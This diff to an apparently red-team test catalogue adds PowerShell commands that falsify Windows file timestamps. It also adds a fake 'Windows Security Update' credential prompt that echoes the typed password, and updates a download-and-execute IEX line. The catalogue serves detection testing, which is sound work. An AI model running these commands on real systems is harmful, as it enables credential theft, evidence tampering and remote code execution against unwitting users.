@@ -8940,6 +8940,72 @@ defense-evasion:
         command: 'touch -acmr #{reference_file_path} {target_file_path}
 
 '
+    - name: Windows - Modify file creation timestamp with PowerShell
+      description: |
+        Modifies the file creation timestamp of a specified file.
+
+        This technique was seen in use by the Stitch RAT.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: Path of file to change creation timestamp
+          type: Path
+          default: C:\Some\file.txt
+        target_date_time:
+          description: Date/time to replace original timestamps with
+          type: String
+          default: '1970-01-01 00:00:00'
+      executor:
+        name: command_prompt
+        command: 'powershell.exe Get-ChildItem #{file_path} | % { $_.CreationTime
+          = #{target_date_time} }
+
+'
+    - name: Windows - Modify file last modified timestamp with PowerShell
+      description: |
+        Modifies the file last modified timestamp of a specified file.
+
+        This technique was seen in use by the Stitch RAT.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: Path of file to change last modified timestamp
+          type: Path
+          default: C:\Some\file.txt
+        target_date_time:
+          description: Date/time to replace original timestamps with
+          type: String
+          default: '1970-01-01 00:00:00'
+      executor:
+        name: command_prompt
+        command: 'powershell.exe Get-ChildItem #{file_path} | % { $_.LastWriteTime
+          = #{target_date_time} }
+
+'
+    - name: Windows - Modify file last access timestamp with PowerShell
+      description: |
+        Modifies the last access timestamp of a specified file.
+
+        This technique was seen in use by the Stitch RAT.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: Path of file to change last access timestamp
+          type: Path
+          default: C:\Some\file.txt
+        target_date_time:
+          description: Date/time to replace original timestamps with
+          type: String
+          default: '1970-01-01 00:00:00'
+      executor:
+        name: command_prompt
+        command: 'powershell.exe Get-ChildItem #{file_path} | % { $_.LastAccessTime
+          = #{target_date_time} }
+
+'
   T1127:
     technique:
       id: attack-pattern--ff25900d-76d5-449b-a351-8824e62fc81b
@@ -14327,21 +14393,18 @@ credential-access:
       created: '2017-12-14T16:46:06.044Z'
       identifier: T1141
     atomic_tests:
-    - name: Prompt User for Password
+    - name: PowerShell - Prompt User for Password
       description: |
-        Prompt User for Password (Local Phishing)
-        Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
-      supported_platforms:
-      - macos
-      executor:
-        name: sh
-        command: 'osascript -e ''tell app "System Preferences" to activate'' -e ''tell
-          app "System Preferences" to activate'' -e ''tell app "System Preferences"
-          to display dialog "Software Update requires that you type your password
-          to apply changes." & return & return  default answer "" with icon 1 with
-          hidden answer with title "Software Update"''
+        Prompt User for Password (Local Phishing) as seen in Stitch RAT.
 
-'
+        Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        command: powershell.exe -command {$cred = $host.UI.PromptForCredential('Windows
+          Security Update', '',[Environment]::UserName, [Environment]::UserDomainName);
+          echo $cred.GetNetworkCredential().Password;}
   T1142:
     technique:
       id: attack-pattern--9e09ddb2-1746-4448-9cad-7f8b41777d6d
@@ -18814,7 +18877,7 @@ collection:
             PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
 
           Download and Execute
-            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Get-Inbox.ps1')"
+            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114/Get-Inbox.ps1')"
   T1056:
     technique:
       id: attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2
